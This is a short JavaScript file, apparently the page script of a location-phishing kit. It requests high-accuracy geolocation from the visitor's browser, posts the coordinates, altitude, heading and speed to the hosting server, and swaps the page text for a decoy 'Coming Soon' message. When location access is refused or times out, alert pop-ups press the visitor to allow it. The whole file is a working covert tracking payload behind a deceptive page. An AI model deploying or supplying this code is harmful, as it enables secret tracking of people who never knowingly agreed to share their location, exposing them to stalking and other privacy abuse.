function locate()
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 25000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Geolocation is not Supported by your Browser...');
  }

  function showPosition(position) {
    var lat = position.coords.latitude ? position.coords.latitude + ' deg' : 'Not Available';
    var lon = position.coords.longitude ? position.coords.longitude + ' deg' : 'Not Available';
    var acc = position.coords.accuracy ? position.coords.accuracy + ' m' : 'Not Available';
    var alt = position.coords.altitude ? position.coords.altitude + ' m' : 'Not Available';
    var dir = position.coords.heading ? position.coords.heading + ' deg' : 'Not Available';
    var spd = position.coords.speed ? position.coords.speed + ' m/s' : 'Not Available';
    var pyjam_url=document.URL;
    var uri = pyjam_url.substring(0, pyjam_url.indexOf('/', 7));

    $.ajax({
      type: 'POST',
      url: uri,
      contentType: 'application/x-www-form-urlencoded',
      data: {Lat:lat,Lon:lon,Acc:acc,Alt:alt,Dir:dir,Spd:spd},
      success: function(){$('#change').html('Coming Soon');},
    });
  }

}

function showError(error)
{
  var err_text;
  var err_status = 'failed';

	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			err_text = 'User denied the request for Geolocation';
      alert('Please Refresh This Page and Allow Location Permission...');
      break;
		case error.POSITION_UNAVAILABLE:
			err_text = 'Location information is unavailable';
			break;
		case error.TIMEOUT:
			err_text = 'The request to get user location timed out';
      alert('Please Set Your Location Mode on High Accuracy...');
			break;
		case error.UNKNOWN_ERROR:
			err_text = 'An unknown error occurred';
			break;
	}

  $.ajax({
    type: 'POST',
    url: 'error_handler.php',
    data: {Status: err_status, Error: err_text},
    success: function(){$('#change').html('Failed');},
    mimeType: 'text'
  });
}
